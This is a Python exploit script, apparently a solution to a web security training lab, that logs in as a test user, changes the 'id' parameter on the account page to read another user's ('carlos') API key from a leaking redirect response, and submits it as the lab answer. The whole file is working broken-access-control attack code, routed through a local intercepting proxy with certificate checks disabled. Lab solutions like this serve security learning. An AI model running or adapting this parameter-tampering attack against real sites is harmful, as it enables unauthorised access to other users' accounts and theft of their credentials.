import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = { 'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080' }

def get_csrf_token(s, url):
    login_url = url + "/login"
    r = s.get(login_url, verify=False, proxies=PROXIES)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name':'csrf'})['value']
    return csrf

def get_carlos_api_key(s, url):
    
    # Step 1 : login as wiener by given creds
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, url)
    login_data = { 'csrf' : csrf_token, 'username' : 'wiener', 'password' : 'peter' }

    r = s.post(login_url, data=login_data, verify=False, proxies=PROXIES)
    res = r.text
    if "Log out" in res:
        print("(+) User Wiener login successful")

        # Exploiting the data leakage vulnerability by changing userId=carlos
        carlos_account_url = url + "/my-account?id=carlos"
        r = s.get(carlos_account_url, allow_redirects=False, verify=False, proxies=PROXIES)
        res = r.text
        if "carlos" in res:
            print("(+) We are loged in as carlos")
            api_key = re.search(r'Your API Key is:(.*)</div>', res)
            api_key = api_key.group(1).strip()
            print("(+) Carlos API key is  : ", api_key)

            # lets verify the exploit by submitting solution
            submit_url = url + "/submitSolution"
            submission_data = { 'answer' : api_key}
            r = s.post(submit_url, data=submission_data, verify=False, proxies=PROXIES)

            r = requests.get(url, verify=False, proxies=PROXIES)
            res = r.text
            if "Congratulations, you solved the lab!" in res:
                print("(+) Exploitation successful!")
                sys.exit(-1)
            else:
                print("(+) Exploitation failed.")
                sys.exit(-1)
        else:
            print("(+) Carlos account access failure")
    else:
        print("(+) User wiener login failed")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage %s <url>" % sys.argv[0])
        print("(+) Example %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1].rstrip('/')
    print("[*] Starting the Exploit : Broken Access Control - User ID controlled by request parameter with data leakage in redirect")
    get_carlos_api_key(s, url)

if __name__ == "__main__":
    main()